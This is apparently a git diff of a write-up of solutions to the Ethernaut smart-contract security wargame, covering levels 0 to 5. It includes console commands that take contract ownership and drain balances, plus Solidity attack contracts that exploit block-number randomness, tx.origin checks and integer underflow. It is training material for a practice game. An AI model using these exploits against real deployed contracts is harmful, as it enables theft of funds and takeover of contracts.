@@ -1,78 +1,80 @@
 # Ethernaut solution
+## 0. Hello Ethernaut
+The goal of this level is to familiarise yourself with how to interact with the current instance through the developer console. You should definitely go through this level yourself 🙂 hint: type await contract.info(). If you reaaaaaaaally need another hint, await contract.password(). Ok that's about all the hints I'm going to give you.
 
 ## 1. Fallback
-Abusing erroneous logic between contract functions and fallback function.
+The goal of this level is to become the owner and to reduce the balance of the contract to 0.
+
+Let's start by figuring out how to become the owner. If you look at the contract code, the only feasible way of becoming the owner is to trigger the `receive` function. There is a `require` statement that needs to pass so we will call the `contribute` function and specify any value less than 0.001 ETH.
+
+Thereafter we will initiate a plain ETH transfer into the contract to become the owner. To complete the second requirement, we will call the `withdraw` function to withdraw the funds out.
+
 ```
-await contract.contribute({value: 1234});
-await contract.sendTransaction({value: 1234});
+await contract.contribute({value: 1337});
+await contract.send({value: 1337});
 await contract.withdraw();
 ```
 
 ## 2. Fallout
-Constructor is spelled wrongly so it becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0 and above.
+In earlier versions of solidity, the constructor of a contract is defined by a function with the same name as the contract i.e. if your contract name is `Test`, the name of your constructor needs to be `Test` as well.
+
+As of solidity 0.5.0, this is no longer the case but we can still learn something important here — contracts can have malicious functions that are hidden in plain sight. In this example, the function `Fal1out` is spelt incorrectly. It is very easy to miss out on this when skimming through the code.
+
+To become the owner, we can call the `Fal1out` function.
 ```
-await contract.Fal1out({value: 1234});
-await contract.sendAllocation(await contract.owner());
+await contract.Fal1out({value: 1337});
 ```
 
 ## 3. Coinflip
-Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.
+The goal of this level is to guess result of `side` correctly 10 times in a row. The chance of this happening is 0.5^10 or 0.0009765625% which _could_ happen but very very unlikely. Fortunately for us, the contract has a flaw with their flipping algorithm, specifically relying on `block.number` as a form of randomness. A malicious user can always calculate the correct answer if they run the same algorithm in their attack function before calling your flip function. Deploy the following contract on remix and call the `attack` function to take over the victim contract.
+```
+pragma solidity ^0.8.0;
 
-Note: For some reason, I can't seem to call these functions more than once in the same function call i.e. another function that calls one of these malicious functions multiple times in one function call.
-``` 
-pragma solidity ^0.6.0;
-import "./CoinFlip.sol";
-import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";
+contract AttackCoinflip {
+    address victim = 0x9010BCEbf802A031eabB52B22F3ec1331D923bBd;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-contract AttackCoinFlip {
-    using SafeMath for uint;
-    
-    address public targetContract;
-    
-    constructor(address _targetContract) public {
-        targetContract = _targetContract;
-    }
-    
-    function attackFlipWithContract() public{
-        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
+    function attack() public {
+        // This is the same algorithm that is used by the victim contract
+        // I am calculating the value for side before calling the victim contract.
+        // This will always be correct because both functions are called in the same block.
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
-        CoinFlip(targetContract).flip(side);
-    }
-    
-    function attackFlipWithout() public {
-        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
-        bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
-        (bool success, ) = targetContract.call(payload);
+
+        // Normally you would use import the contract here so that you can call the
+        // function directly but if you're lazy like me, you call call the function
+        // like this as well. This approach is useful for when you don't have access
+        // to the source code of the contract you want to interact with.
+        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
+        (bool success, ) = victim.call{value: 0 ether}(payload);
         require(success, "Transaction call using encodeWithSignature is successful");
     }
 }
 ```
 
 ## 4. Telephone
-When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin.
+The way to break this level is to understand how tx.origin works. When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin. Deploy the following contract on remix and call the `attack` function to take over the victim contract.
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
+
 contract AttackTelephone {
-    address public telephone;
-    
-    constructor(address _telephone) public {
-        telephone = _telephone;
-    }
-    
-    function changeBadOwner(address badOwner) public {
-        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", badOwner);
-        (bool success, ) = telephone.call(payload);
+    address victim = 0x5fD8a73D2F2BAb543A2a42bDEe3688a05f40829b;
+
+    function attack() public {
+        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", msg.sender);
+        (bool success, ) = victim.call{value: 0}(payload);
         require(success, "Transaction call using encodeWithSignature is successful");
     }
 }
 ```
 
 ## 5. Token
-No integer over/underflow protection. Always use [safemath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) libraries. As long as you pass a value > 20, the condition in the first require statement will underflow and it will always pass. 
+In earlier versions of solidity, smart contract developers have to be mindful when operating on unsigned integers as one might accidentally cause an integer under/overflow. A library like safemath was created to help operate on these integers safely but as of solidity 0.8.0, this is no longer necessary because solidity 0.8.0 introduces a [built-in check on arithmetic operations](https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html).
+
+In order to become the owner of this contract, you simply need to pass a value > 20 since the condition in the first require statement will underflow and therefore will always pass.
 ```
-await contract.transfer(instance, 25)
+await contract.transfer(instance, 21)
 ```
 
 ## 6. Delegation
